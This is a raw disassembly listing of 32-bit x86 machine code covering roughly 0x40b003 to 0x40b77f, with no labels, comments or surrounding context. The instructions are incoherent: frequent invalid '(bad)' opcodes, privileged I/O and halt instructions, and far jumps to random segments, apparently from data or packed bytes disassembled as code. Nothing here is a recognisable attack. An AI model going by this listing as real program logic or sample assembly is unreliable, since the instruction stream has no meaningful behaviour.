  40b003:	and    DWORD PTR [ebx],eax
  40b005:	test   eax,0x3a96af27
  40b00a:	push   esi
  40b00b:	push   ebx
  40b00c:	jmp    0x9f5ae75c
  40b011:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b012:	or     ebx,0xffffffe8
  40b015:	jmp    0x1d4f01fa
  40b01a:	xchg   DWORD PTR [ebx+0x3b],ebp
  40b01d:	jp     0x40afbb
  40b01f:	sbb    eax,0xa37a957d
  40b024:	jmp    0xce8b56b1
  40b029:	pop    DWORD PTR [eax+0x48edbcd7]
  40b02f:	mov    bl,0xaf
  40b031:	mov    ch,0x37
  40b033:	leave  
  40b034:	jp     0x40b05a
  40b036:	dec    DWORD PTR [ebx+0x3d43a8bf]
  40b03c:	mov    ecx,0x92c54a81
  40b041:	cmp    al,0xa7
  40b043:	cmp    edi,DWORD PTR [ecx+ecx*1]
  40b046:	dec    eax
  40b047:	or     eax,0x84c55939
  40b04c:	fist   DWORD PTR [ebx+0x15]
  40b04f:	(bad)  
  40b050:	cld    
  40b051:	popa   
  40b052:	jae    0x40b06c
  40b054:	dec    eax
  40b055:	ins    DWORD PTR es:[edi],dx
  40b056:	popa   
  40b057:	pop    ecx
  40b058:	ret    
  40b059:	jmp    0x40b0af
  40b05b:	xor    al,0x28
  40b05d:	fisub  WORD PTR [edi+esi*1]
  40b060:	mov    ss,WORD PTR [esp+edx*2-0x59]
  40b064:	popa   
  40b065:	inc    edx
  40b066:	jg     0x40b075
  40b068:	sbb    DWORD PTR [ebp-0x7a83f3e5],edx
  40b06e:	hlt    
  40b06f:	mov    edi,0x40281552
  40b074:	cs jmp 0xd864:0x429af532
  40b07c:	jmp    0x40b037
  40b07e:	pusha  
  40b07f:	cld    
  40b080:	test   esi,edx
  40b082:	pop    esi
  40b083:	test   DWORD PTR [esi+0x18],0x5e1ec97a
  40b08a:	pop    ss
  40b08b:	les    edi,FWORD PTR [esi-0x2a]
  40b08e:	pop    es
  40b08f:	adc    ecx,esp
  40b091:	clc    
  40b092:	adc    bh,BYTE PTR [ebx+0x469858f5]
  40b098:	das    
  40b099:	(bad)  
  40b09a:	(bad)  [ecx-0x21]
  40b09d:	pushf  
  40b09e:	loop   0x40b03f
  40b0a0:	adc    al,0x67
  40b0a2:	cmp    ch,BYTE PTR gs:[ebx+0x26435c9a]
  40b0a9:	and    eax,0x7c60b7da
  40b0ae:	push   ecx
  40b0af:	pop    ecx
  40b0b0:	test   al,0x20
  40b0b2:	es mov eax,0x657af0f0
  40b0b8:	inc    ebp
  40b0b9:	not    DWORD PTR [ebx+eax*1+0x665664bf]
  40b0c0:	or     dl,dh
  40b0c2:	retf   
  40b0c3:	inc    esi
  40b0c4:	jg     0x40b10b
  40b0c6:	inc    ebx
  40b0c7:	test   ebp,ebx
  40b0c9:	enter  0xbd82,0x48
  40b0cd:	push   esp
  40b0ce:	mov    eax,0x44d240cd
  40b0d3:	aas    
  40b0d4:	outs   dx,DWORD PTR ds:[esi]
  40b0d5:	dec    edi
  40b0d6:	xor    esp,DWORD PTR [esi+0x5]
  40b0d9:	mov    bl,0xed
  40b0db:	mov    ecx,0x9f234462
  40b0e0:	fcom   st(0)
  40b0e2:	push   DWORD PTR [edi+0x4004e754]
  40b0e8:	ins    BYTE PTR es:[edi],dx
  40b0e9:	jecxz  0x40b152
  40b0eb:	std    
  40b0ec:	and    ebx,eax
  40b0ee:	arpl   bx,di
  40b0f0:	xchg   BYTE PTR [ebx-0x4d2f0477],al
  40b0f6:	push   ebx
  40b0f8:	dec    esi
  40b0f9:	in     al,0x70
  40b0fb:	and    al,0xb9
  40b0fd:	mov    eax,ds:0x65b333c7
  40b102:	lahf   
  40b103:	sbb    BYTE PTR [edx+0x3b40f380],bl
  40b109:	mov    esi,0x9d13f71
  40b10e:	xor    eax,DWORD PTR [ecx+0x48]
  40b111:	sub    eax,0x951851e6
  40b116:	xor    al,0x3e
  40b118:	mov    ebx,DWORD PTR [edi-0x42494d10]
  40b11e:	jnp    0x40b125
  40b120:	stc    
  40b121:	xor    DWORD PTR [eax+0x447ed9b2],eax
  40b127:	icebp  
  40b128:	sahf   
  40b129:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b12a:	push   esp
  40b12b:	scas   al,BYTE PTR es:[edi]
  40b12c:	xlat   BYTE PTR ds:[ebx]
  40b12d:	xchg   DWORD PTR [esi-0x52],ebx
  40b130:	sub    eax,0x51b664d0
  40b135:	aas    
  40b136:	mov    ds:0x2b19da2,eax
  40b13b:	dec    esi
  40b13c:	mov    ch,0x31
  40b13e:	(bad)  
  40b13f:	pop    esp
  40b140:	fwait
  40b141:	dec    eax
  40b142:	sub    ecx,ebp
  40b144:	push   ss
  40b145:	jle    0x40b19a
  40b147:	push   edx
  40b148:	mov    edx,0xb15a2700
  40b14d:	inc    ebx
  40b14e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b14f:	inc    ebp
  40b150:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b151:	xchg   esi,eax
  40b152:	daa    
  40b153:	popa   
  40b154:	jecxz  0x40b195
  40b156:	jo     0x40b1b7
  40b158:	imul   edi,DWORD PTR [esi+0x6b],0x2fd24726
  40b15f:	out    dx,al
  40b160:	in     eax,dx
  40b161:	jo     0x40b197
  40b163:	nop
  40b164:	mov    bl,0xe4
  40b166:	sbb    DWORD PTR [edx+0x1b803e08],ebx
  40b16c:	call   0xa422:0xfd96d19a
  40b173:	sbb    bl,BYTE PTR [edx-0x243da3c6]
  40b179:	lea    ebp,[eax]
  40b17b:	imul   esi,DWORD PTR [edi],0x4c
  40b17e:	mov    edx,ds
  40b180:	imul   esp,DWORD PTR [eax-0x5bdf644],0x4ee3bbd9
  40b18a:	xor    BYTE PTR [edi+0x39b976aa],dl
  40b190:	jbe    0x40b188
  40b192:	xchg   BYTE PTR [ebx+ebp*2-0x39bab8e6],cl
  40b199:	jno    0x40b131
  40b19b:	cmp    BYTE PTR [ebx+0x4683f533],ah
  40b1a1:	and    ecx,DWORD PTR [ebx-0x375def9b]
  40b1a7:	shl    BYTE PTR [eax],1
  40b1a9:	mov    al,ds:0xf5c247a7
  40b1ae:	dec    BYTE PTR cs:[edi-0xe]
  40b1b2:	mov    dh,0xcb
  40b1b4:	push   ebx
  40b1b5:	outs   dx,BYTE PTR ds:[esi]
  40b1b6:	lds    ebp,FWORD PTR ds:0xfe58e193
  40b1bc:	inc    edx
  40b1bd:	push   es
  40b1be:	xor    DWORD PTR [ecx-0x5b],esp
  40b1c1:	pop    edx
  40b1c2:	sti    
  40b1c3:	xlat   BYTE PTR ds:[ebx]
  40b1c4:	push   ds
  40b1c5:	cld    
  40b1c6:	cmp    eax,0x8b45a7b4
  40b1cb:	clc    
  40b1cc:	or     al,0x0
  40b1ce:	inc    eax
  40b1cf:	daa    
  40b1d0:	jp     0x40b1a7
  40b1d2:	mov    eax,ds:0x99ffc537
  40b1d7:	xchg   edx,eax
  40b1d8:	sbb    al,0xf9
  40b1da:	loopne 0x40b233
  40b1dc:	(bad)  
  40b1de:	pop    ds
  40b1df:	and    eax,eax
  40b1e1:	push   ss
  40b1e2:	add    esp,edi
  40b1e4:	scas   al,BYTE PTR es:[edi]
  40b1e5:	inc    esp
  40b1e6:	stos   BYTE PTR es:[edi],al
  40b1e7:	vpshlq xmm2,xmm3,[esi]
  40b1ec:	sub    al,0xc2
  40b1ee:	push   edi
  40b1ef:	ins    BYTE PTR es:[edi],dx
  40b1f0:	xchg   ebp,eax
  40b1f1:	movaps xmm3,XMMWORD PTR [esi+0x92d01ec]
  40b1f8:	lock push cs
  40b1fa:	(bad)  
  40b1fb:	push   cs
  40b1fc:	sbb    esp,edx
  40b1fe:	or     eax,0xa9585ed
  40b203:	rol    DWORD PTR [ecx-0x43c6af15],1
  40b209:	sub    ebx,DWORD PTR [eax-0x2077ef62]
  40b20f:	pop    ds
  40b210:	ret    
  40b211:	cli    
  40b212:	pushf  
  40b213:	sub    BYTE PTR [eax+0x191affb6],cl
  40b219:	add    DWORD PTR [eax],edi
  40b21b:	jmp    0xd68b:0x4d21bf39
  40b222:	out    dx,al
  40b223:	fmul   DWORD PTR [edx-0xe090f46]
  40b229:	enter  0xea21,0xf7
  40b22d:	mov    bh,ch
  40b22f:	inc    eax
  40b230:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b231:	push   ds
  40b232:	mov    ds:0xcade32e1,al
  40b237:	xlat   BYTE PTR ds:[ebx]
  40b238:	aam    0x5e
  40b23a:	cwde   
  40b23b:	sbb    ebp,edi
  40b23d:	adc    DWORD PTR [ecx-0x4e2ca735],0x1e545bdf
  40b247:	mov    ah,0xdf
  40b249:	bound  esi,QWORD PTR [ebp+0x3e81ae1e]
  40b24f:	fsub   DWORD PTR [eax+0x6c]
  40b252:	imul   ebx,DWORD PTR [eax],0x9ea0cccf
  40b258:	xchg   esp,eax
  40b259:	sub    eax,0x20d5086b
  40b25e:	mov    esi,0x198e4ea9
  40b263:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b264:	xchg   ebp,eax
  40b265:	outs   dx,DWORD PTR ds:[esi]
  40b266:	push   ecx
  40b267:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b268:	fdiv   st,st(1)
  40b26a:	mov    dh,0xbd
  40b26c:	jno    0x40b2d2
  40b26e:	retf   
  40b26f:	into   
  40b270:	pushf  
  40b271:	mov    fs,WORD PTR [eax-0x31ad00c8]
  40b277:	and    al,0x60
  40b279:	into   
  40b27a:	add    DWORD PTR [eax+0x304f3c72],0xffffffe5
  40b281:	ror    DWORD PTR [ebp+0x3258df7c],0x5b
  40b288:	cs and al,0x48
  40b28b:	add    dl,BYTE PTR [esi+ebx*2+0x2f]
  40b28f:	(bad)  
  40b290:	xchg   ebx,eax
  40b291:	ret    
  40b292:	cli    
  40b293:	sub    DWORD PTR [edi-0x11d1a7a6],ebx
  40b299:	push   esi
  40b29a:	icebp  
  40b29b:	cmc    
  40b29c:	pop    ebx
  40b29d:	xchg   DWORD PTR [ecx+0x4b],ebx
  40b2a0:	push   ebp
  40b2a1:	dec    edx
  40b2a2:	lea    eax,[esi]
  40b2a4:	adc    DWORD PTR [ecx],esi
  40b2a6:	mov    bl,0xff
  40b2a8:	jp     0x40b267
  40b2aa:	test   eax,0x2dbd0b20
  40b2af:	sub    DWORD PTR [esi+eax*8+0x2b60681c],0xffffff81
  40b2b7:	cdq    
  40b2b8:	shl    DWORD PTR [ebx-0x6479331c],1
  40b2be:	pop    ecx
  40b2bf:	push   edi
  40b2c0:	cmc    
  40b2c1:	push   ds
  40b2c2:	fisttp QWORD PTR [eax-0x3d4693c]
  40b2c8:	cld    
  40b2c9:	hlt    
  40b2ca:	adc    eax,0x11fc7415
  40b2cf:	and    ecx,DWORD PTR [eax]
  40b2d1:	xchg   DWORD PTR [ebp+0x2f7e6552],ecx
  40b2d7:	loope  0x40b340
  40b2d9:	retf   
  40b2da:	ror    BYTE PTR [esi+edx*4+0x29ec862],1
  40b2e1:	mov    ds,WORD PTR [edx]
  40b2e3:	pop    edx
  40b2e4:	ret    0x950c
  40b2e7:	loope  0x40b2a9
  40b2e9:	dec    ecx
  40b2ea:	dec    ebx
  40b2eb:	(bad)  
  40b2ec:	es es add bh,bl
  40b2f0:	sahf   
  40b2f1:	add    BYTE PTR [esi+0xd],dl
  40b2f4:	pop    ebx
  40b2f5:	popa   
  40b2f6:	jno    0x40b30e
  40b2f8:	xchg   BYTE PTR [ebx-0x5ec1b09b],dh
  40b2fe:	inc    ebx
  40b2ff:	rcr    DWORD PTR [ebx+0x66],1
  40b302:	mov    eax,0x1efe3422
  40b307:	push   ds
  40b308:	mov    BYTE PTR [esi],dh
  40b30a:	xchg   edi,eax
  40b30b:	lock int3 
  40b30d:	mov    bh,0x40
  40b30f:	scas   al,BYTE PTR es:[edi]
  40b310:	rcr    BYTE PTR [esi],cl
  40b312:	lea    esi,[ebp+0x3c8f59e7]
  40b318:	cmc    
  40b319:	xor    edi,DWORD PTR [ecx]
  40b31b:	add    al,0xbf
  40b31d:	xor    DWORD PTR [ecx-0x3ff32197],0xb91883e
  40b327:	and    DWORD PTR [ecx],ebp
  40b329:	add    al,0x33
  40b32b:	push   esp
  40b32c:	dec    esp
  40b32d:	sub    dh,BYTE PTR ds:0x90fae547
  40b333:	pop    edx
  40b334:	inc    edx
  40b335:	ss mov ah,0x3
  40b338:	mov    edx,0xfa8447b4
  40b33d:	mov    bl,0x36
  40b33f:	sar    DWORD PTR [ecx-0x43],cl
  40b342:	lahf   
  40b343:	shl    BYTE PTR [esi+0x74],0xab
  40b347:	mov    al,0xeb
  40b349:	fsubr  QWORD PTR [ebx+0x4]
  40b34c:	mov    eax,0x90e57799
  40b351:	and    BYTE PTR [eax+0x73],dl
  40b354:	ins    DWORD PTR es:[edi],dx
  40b355:	test   edx,ecx
  40b357:	push   edx
  40b358:	pop    ss
  40b359:	jmp    0xb86a:0xa8383ee1
  40b360:	clc    
  40b361:	pop    ss
  40b362:	jp     0x40b38a
  40b364:	mov    al,es:0xb1b74a46
  40b36a:	rcr    DWORD PTR [ebx-0x27a707f1],1
  40b370:	push   ds
  40b371:	xchg   ebp,eax
  40b372:	sbb    dh,BYTE PTR [edx+0x74]
  40b375:	lock push ds
  40b377:	cmp    al,0x1e
  40b379:	out    dx,eax
  40b37a:	adc    esi,DWORD PTR [ecx+edi*2+0x28]
  40b37e:	sbb    eax,0x5a7c4980
  40b383:	jo     0x40b38c
  40b385:	(bad)  
  40b386:	xchg   edi,eax
  40b387:	out    dx,eax
  40b388:	js     0x40b33b
  40b38a:	test   BYTE PTR [ebx],cl
  40b38c:	scas   eax,DWORD PTR es:[edi]
  40b38d:	out    0x5f,al
  40b38f:	loop   0x40b31f
  40b391:	mov    ch,0x43
  40b393:	cli    
  40b394:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b395:	push   esp
  40b396:	push   cs
  40b397:	mov    cl,0x5
  40b399:	dec    ebp
  40b39a:	lock cmp al,0xe4
  40b39d:	pop    es
  40b39e:	inc    ebx
  40b39f:	mov    BYTE PTR [esi],dl
  40b3a1:	xchg   esp,eax
  40b3a2:	ret    
  40b3a3:	jb     0x40b32b
  40b3a5:	add    DWORD PTR [edx+esi*4-0x2d3dd470],edx
  40b3ac:	mov    bl,0xf3
  40b3ae:	mov    ds:0x84cae7a,eax
  40b3b3:	rcr    DWORD PTR [edx-0x554df958],cl
  40b3b9:	sbb    al,bl
  40b3bb:	pop    ds
  40b3bc:	sbb    eax,0x772d1ae0
  40b3c1:	stc    
  40b3c2:	scas   al,BYTE PTR es:[edi]
  40b3c3:	lahf   
  40b3c4:	mov    ebx,0x50d4c10f
  40b3c9:	(bad)  
  40b3ca:	leave  
  40b3cb:	dec    esp
  40b3cc:	pop    ds
  40b3cd:	adc    ecx,eax
  40b3cf:	sub    al,0x4c
  40b3d1:	out    dx,eax
  40b3d2:	je     0x40b375
  40b3d4:	xor    al,0x3a
  40b3d6:	ja     0x40b391
  40b3d8:	dec    ebx
  40b3d9:	jg     0x40b3c8
  40b3db:	shl    DWORD PTR [ecx-0x24],cl
  40b3de:	sbb    bl,BYTE PTR [ebx+ebp*4+0x51fcff6f]
  40b3e5:	dec    ebp
  40b3e6:	xor    DWORD PTR [edx+0x765427f7],0x58742214
  40b3f0:	add    eax,0x8eb98eca
  40b3f5:	lahf   
  40b3f6:	lock xchg esp,eax
  40b3f8:	int    0xed
  40b3fa:	or     DWORD PTR [eax-0xb],eax
  40b3fd:	inc    ebp
  40b3fe:	jl     0x40b44c
  40b400:	jne    0x40b45b
  40b402:	jl     0x40b41f
  40b404:	inc    DWORD PTR [edi-0x233de870]
  40b40a:	test   eax,0x30e5421c
  40b40f:	ret    0x663d
  40b412:	cdq    
  40b413:	pop    ebx
  40b414:	or     eax,0xf064c048
  40b419:	cmp    al,0xa1
  40b41b:	data16 adc bl,dh
  40b41e:	ror    BYTE PTR [ecx],cl
  40b420:	mov    bh,0x63
  40b422:	adc    ecx,DWORD PTR [ebx-0x5c]
  40b425:	push   0x7333b7bc
  40b42a:	scas   eax,DWORD PTR es:[edi]
  40b42b:	(bad)  
  40b42c:	ret    0x9e39
  40b42f:	call   0xee0a:0x9c05349c
  40b436:	scas   eax,DWORD PTR es:[edi]
  40b437:	es ins BYTE PTR es:[edi],dx
  40b439:	adc    dh,ah
  40b43b:	mov    DWORD PTR [edx],0x5cb57883
  40b441:	push   es
  40b442:	jmp    0x541d:0xfc92b118
  40b449:	xor    bh,dl
  40b44b:	inc    DWORD PTR [ecx-0x62]
  40b44e:	sub    BYTE PTR [ebx-0x20],al
  40b451:	cmp    DWORD PTR [esi],0xffffff89
  40b454:	mov    al,ds:0x93f14a53
  40b459:	enter  0xd478,0x79
  40b45d:	mov    bl,dl
  40b45f:	scas   al,BYTE PTR es:[edi]
  40b460:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b461:	dec    esi
  40b462:	(bad)  
  40b463:	mov    al,0x9f
  40b465:	cdq    
  40b466:	sar    DWORD PTR [eax+0x5699a321],0x43
  40b46d:	daa    
  40b46e:	test   al,0x9a
  40b470:	pushf  
  40b471:	jle    0x40b4db
  40b473:	lock stc 
  40b475:	iret   
  40b476:	and    bh,bl
  40b478:	mov    ebx,0x30c93c6d
  40b47d:	(bad)
  40b480:	out    0xc,eax
  40b482:	add    ch,BYTE PTR [ebx-0x24cc2a3f]
  40b488:	fcmovnbe st,st(0)
  40b48a:	sbb    bl,BYTE PTR [ecx]
  40b48c:	jmp    0x7895:0xd4d5765f
  40b493:	hlt    
  40b494:	ror    BYTE PTR fs:[eax+0x75a6d2e6],cl
  40b49b:	add    DWORD PTR [eax],edx
  40b49d:	enter  0x6fac,0x93
  40b4a1:	fidiv  WORD PTR [eax-0xd]
  40b4a4:	shr    bh,cl
  40b4a6:	in     al,0x1
  40b4a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b4a9:	loop   0x40b4c8
  40b4ab:	loopne 0x40b52c
  40b4ad:	or     eax,0x9bf9875b
  40b4b2:	push   ecx
  40b4b3:	cmp    eax,0x46c1d08
  40b4b8:	mov    bh,0x50
  40b4ba:	das    
  40b4bb:	lds    edi,FWORD PTR [edx-0x48]
  40b4be:	xor    BYTE PTR [ebx+0x69247e61],0x90
  40b4c5:	jmp    0xcede3de9
  40b4ca:	retf   
  40b4cb:	sbb    al,0x89
  40b4cd:	(bad)  
  40b4cf:	sub    al,0x63
  40b4d1:	pop    edx
  40b4d2:	pop    ebx
  40b4d3:	shl    DWORD PTR [ecx],cl
  40b4d5:	retf   0x1e20
  40b4d8:	push   cs
  40b4d9:	(bad)  
  40b4da:	adc    BYTE PTR [ecx],bh
  40b4dc:	or     eax,0x8206bf34
  40b4e1:	cmp    BYTE PTR [edx],dl
  40b4e3:	aam    0x78
  40b4e5:	xchg   esi,eax
  40b4e6:	push   eax
  40b4e7:	cmp    ch,BYTE PTR [esp+ebx*8+0x64f16543]
  40b4ee:	jp     0x40b512
  40b4f0:	xchg   edi,eax
  40b4f1:	mov    edi,DWORD PTR [eax+0x4f6ee8ae]
  40b4f7:	mov    ecx,0xdfe7944d
  40b4fc:	jne    0x40b4b9
  40b4fe:	sahf   
  40b4ff:	push   0x3e
  40b501:	adc    ch,bh
  40b503:	and    DWORD PTR [edx-0xb],ecx
  40b506:	int    0x5f
  40b508:	mov    ss,WORD PTR [ebx+eax*2]
  40b50b:	jp     0x40b572
  40b50d:	or     eax,0xdabe5470
  40b512:	rcr    BYTE PTR [edx+ebx*1+0x1623a1c9],0x20
  40b51a:	inc    esi
  40b51b:	ret    0x5832
  40b51e:	add    DWORD PTR [edx-0x4f],0x17c03cd5
  40b525:	cmc    
  40b526:	cli    
  40b527:	xor    al,0xb9
  40b529:	ins    DWORD PTR es:[edi],dx
  40b52a:	nop
  40b52b:	imul   ecx,DWORD PTR [esi+0xd],0xffffffb1
  40b52f:	dec    edi
  40b530:	in     al,0xe5
  40b532:	cmp    BYTE PTR [edx-0x4181e1ee],ch
  40b538:	mov    ah,0xdf
  40b53a:	(bad)  
  40b53b:	mov    esp,0xdfd809e
  40b540:	or     eax,0xee1a1e77
  40b545:	add    bl,BYTE PTR ss:[eax+0x1]
  40b549:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b54a:	jns    0x40b563
  40b54c:	inc    ebx
  40b54d:	xchg   edi,eax
  40b54e:	jae    0x40b52c
  40b550:	out    0xba,al
  40b552:	ins    BYTE PTR es:[edi],dx
  40b553:	or     DWORD PTR [esi+0x4f],edx
  40b556:	dec    edx
  40b557:	out    0x2c,al
  40b559:	xchg   edi,eax
  40b55a:	ret    0x3b53
  40b55d:	icebp  
  40b55e:	cmp    esi,DWORD PTR [ebx-0x47e4dd8]
  40b564:	inc    esp
  40b565:	pop    ss
  40b566:	retf   
  40b567:	fld    DWORD PTR [edi]
  40b569:	mov    bh,BYTE PTR [ecx+esi*1-0x32250a50]
  40b570:	jcxz   0x40b507
  40b573:	ret    0xddbc
  40b576:	dec    esi
  40b577:	cs jbe 0x40b50e
  40b57a:	out    0x6,eax
  40b57c:	sub    ebp,edi
  40b57e:	fnstsw WORD PTR [edx]
  40b580:	xchg   ebp,eax
  40b581:	xor    DWORD PTR [esi],esp
  40b583:	push   ecx
  40b584:	push   esi
  40b585:	cwde   
  40b586:	jmp    0xdfc2164d
  40b58b:	(bad)  
  40b58c:	xor    al,0xfb
  40b58e:	jge    0x40b561
  40b590:	sub    dl,bl
  40b592:	or     eax,0x1f60b000
  40b597:	int    0x55
  40b599:	push   es
  40b59a:	test   eax,0x9f52af9e
  40b59f:	xchg   edi,eax
  40b5a0:	xchg   edx,eax
  40b5a1:	xlat   BYTE PTR ds:[ebx]
  40b5a2:	mov    dl,0xcf
  40b5a4:	aam    0x20
  40b5a6:	(bad)  
  40b5a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b5a8:	outs   dx,DWORD PTR ds:[esi]
  40b5a9:	adc    ecx,DWORD PTR [edi]
  40b5ab:	add    ebx,DWORD PTR [eax+0x40]
  40b5ae:	jmp    esi
  40b5b0:	mov    esi,DWORD PTR [ecx]
  40b5b2:	sbb    eax,0x88d1dd28
  40b5b7:	jo     0x40b5e3
  40b5b9:	cmp    esp,DWORD PTR [edi-0x6d8dc8fa]
  40b5bf:	pop    ebp
  40b5c0:	outs   dx,BYTE PTR ds:[esi]
  40b5c1:	clc    
  40b5c2:	ins    BYTE PTR es:[edi],dx
  40b5c3:	ins    DWORD PTR es:[edi],dx
  40b5c4:	cmp    BYTE PTR [esi],al
  40b5c6:	cmc    
  40b5c7:	jl     0x40b561
  40b5c9:	xchg   ebx,eax
  40b5ca:	shl    esp,0x35
  40b5cd:	cdq    
  40b5ce:	and    DWORD PTR [edi+eiz*4-0x41473089],esp
  40b5d5:	pop    ebx
  40b5d6:	inc    eax
  40b5d7:	pop    eax
  40b5d8:	mov    ah,0xa3
  40b5da:	test   BYTE PTR [ebp+0x56],ch
  40b5dd:	lds    ebx,FWORD PTR ds:[edi+0x4a]
  40b5e1:	loopne 0x40b571
  40b5e3:	adc    ecx,DWORD PTR [esi]
  40b5e5:	hlt    
  40b5e6:	mov    BYTE PTR [esp+edi*2+0x3a9e322b],dl
  40b5ed:	leave  
  40b5ee:	jbe    0x40b617
  40b5f0:	push   edx
  40b5f1:	or     eax,0x44eaed61
  40b5f6:	push   ebp
  40b5f7:	arpl   WORD PTR [edi-0x3b62c310],bx
  40b5fd:	sub    eax,0x37b5de6b
  40b602:	loop   0x40b594
  40b604:	out    dx,eax
  40b605:	loop   0x40b5ff
  40b607:	mov    ebx,0x7377da22
  40b60c:	dec    esi
  40b60d:	jg     0x40b61a
  40b60f:	sbb    DWORD PTR [ecx-0x61],0xffffffe5
  40b613:	mov    esi,0xee1c7d43
  40b618:	scas   al,BYTE PTR es:[edi]
  40b619:	push   edx
  40b61a:	jae    0x40b684
  40b61c:	js     0x40b61e
  40b61e:	int    0x4a
  40b620:	rcr    esp,1
  40b622:	imul   esi,edi,0xbfe80894
  40b628:	js     0x40b5d8
  40b62a:	aaa    
  40b62b:	adc    al,0xd2
  40b62d:	jmp    0x40b5e7
  40b62f:	xor    dh,BYTE PTR [esi]
  40b631:	mov    esp,0x82eee7f1
  40b636:	jp     0x40b677
  40b638:	xor    ah,BYTE PTR [esi]
  40b63a:	mov    ecx,0xd6ee4be0
  40b63f:	xchg   ecx,eax
  40b640:	jg     0x40b5cc
  40b642:	sahf   
  40b643:	push   edx
  40b644:	outs   dx,DWORD PTR ds:[esi]
  40b645:	cmp    BYTE PTR [eax-0x318c9087],cl
  40b64b:	mov    esi,0x6b96cf17
  40b650:	aas    
  40b651:	mov    ebx,0xf582eb2
  40b656:	ins    BYTE PTR es:[edi],dx
  40b657:	xchg   edx,eax
  40b658:	mov    bh,0x10
  40b65a:	dec    edi
  40b65b:	aas    
  40b65c:	inc    eax
  40b65d:	aas    
  40b65e:	dec    ebx
  40b65f:	test   edi,eax
  40b661:	mov    edi,0x46ea0934
  40b666:	leave  
  40b667:	loope  0x40b615
  40b669:	sti    
  40b66a:	mov    ch,ah
  40b66c:	push   esp
  40b66d:	jg     0x40b6ed
  40b66f:	std    
  40b670:	or     DWORD PTR [edx],ebx
  40b672:	inc    ecx
  40b673:	das    
  40b674:	push   edx
  40b675:	mov    ebp,0x47387d09
  40b67a:	test   DWORD PTR [esi+0x45d6064b],esi
  40b680:	out    0x26,eax
  40b682:	fisttp QWORD PTR [eax-0x55]
  40b685:	jecxz  0x40b67f
  40b687:	inc    edi
  40b688:	imul   edx,DWORD PTR [ecx],0x63fcd5c2
  40b68e:	into   
  40b68f:	dec    edx
  40b690:	jl     0x40b621
  40b692:	call   0xe6500762
  40b697:	gs inc esp
  40b699:	inc    esp
  40b69a:	mov    dh,0x73
  40b69c:	imul   esp,DWORD PTR [ecx-0x58a281b0],0x423a67e8
  40b6a6:	push   esi
  40b6a7:	gs es scas al,BYTE PTR es:[edi]
  40b6aa:	pop    ss
  40b6ab:	ss dec ecx
  40b6ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6ae:	or     al,0xd6
  40b6b0:	and    DWORD PTR [ecx+0x13],0x69b1bd9e
  40b6b7:	sbb    eax,0x47b6494b
  40b6bc:	cmp    al,dh
  40b6be:	xor    edx,ebx
  40b6c0:	shr    BYTE PTR [edi],1
  40b6c2:	push   ecx
  40b6c3:	scas   eax,DWORD PTR es:[edi]
  40b6c4:	inc    ecx
  40b6c5:	ins    BYTE PTR es:[edi],dx
  40b6c6:	mov    eax,0x67d28ead
  40b6cb:	dec    edx
  40b6cc:	lods   al,BYTE PTR ds:[esi]
  40b6cd:	sub    BYTE PTR [esi+ebx*2-0x77881512],bh
  40b6d4:	dec    edi
  40b6d5:	pop    ebx
  40b6d6:	jecxz  0x40b6ce
  40b6d8:	pop    edx
  40b6d9:	popf   
  40b6da:	cmp    al,0xb5
  40b6dc:	push   cs
  40b6dd:	outs   dx,DWORD PTR ds:[esi]
  40b6de:	pop    ds
  40b6df:	push   es
  40b6e0:	clc    
  40b6e1:	add    ecx,ecx
  40b6e3:	ja     0x40b673
  40b6e5:	push   edi
  40b6e6:	push   ds
  40b6e7:	popf   
  40b6e8:	jle    0x40b761
  40b6ea:	push   0xffffffd0
  40b6ec:	inc    ecx
  40b6ed:	cmp    edx,DWORD PTR [esi-0x3597a69f]
  40b6f3:	inc    eax
  40b6f4:	bound  edi,QWORD PTR [edx]
  40b6f6:	fiadd  DWORD PTR [ebp-0x72]
  40b6f9:	or     al,0x35
  40b6fb:	mov    eax,0xaa65e1eb
  40b700:	test   eax,0x10d933c9
  40b705:	cmp    esp,DWORD PTR [esi+0x5343e35c]
  40b70b:	and    al,0x63
  40b70d:	int    0x90
  40b70f:	out    dx,al
  40b710:	shl    DWORD PTR [esi+edi*2+0x55],0xa9
  40b715:	jle    0x40b777
  40b717:	shr    ch,cl
  40b719:	loop   0x40b77c
  40b71b:	call   0x13fd:0xf6d7b01d
  40b722:	adc    eax,0x17f95426
  40b727:	xor    DWORD PTR ss:[edx],ebp
  40b72a:	je     0x40b711
  40b72c:	xor    DWORD PTR [esi-0x7],edi
  40b72f:	pop    edi
  40b730:	jecxz  0x40b754
  40b732:	pushf  
  40b733:	mov    ebp,0x9d91cc1d
  40b738:	or     DWORD PTR [edi-0x307945d9],0x18
  40b73f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b740:	repnz sub DWORD PTR [edi-0x13841dbc],edx
  40b747:	fisttp WORD PTR [ecx]
  40b749:	scas   eax,DWORD PTR es:[edi]
  40b74a:	data16 adc BYTE PTR [edx],bh
  40b74d:	pop    eax
  40b74e:	es push 0xffffffd6
  40b751:	rcl    BYTE PTR [edx-0x2818a4e2],cl
  40b757:	mov    ebx,0xbefaa38f
  40b75c:	mov    dl,0xec
  40b75e:	loope  0x40b7c1
  40b760:	pop    ebx
  40b761:	out    dx,eax
  40b762:	cmp    BYTE PTR [edi+eax*8],bl
  40b765:	xchg   DWORD PTR [edx+0x9],edx
  40b768:	cdq    
  40b769:	ins    DWORD PTR es:[edi],dx
  40b76a:	xlat   BYTE PTR ds:[ebx]
  40b76b:	mov    ds:0xeaa7ba00,eax
  40b770:	je     0x40b7b6
  40b772:	mov    ecx,0x862981eb
  40b777:	retf   
  40b778:	mov    bl,0x9a
  40b77a:	xor    al,0x39
  40b77c:	ins    BYTE PTR es:[edi],dx
  40b77d:	das    
  40b77e:	stos   DWORD PTR es:[edi],eax
  40b77f:	addr16 aam 0x6a
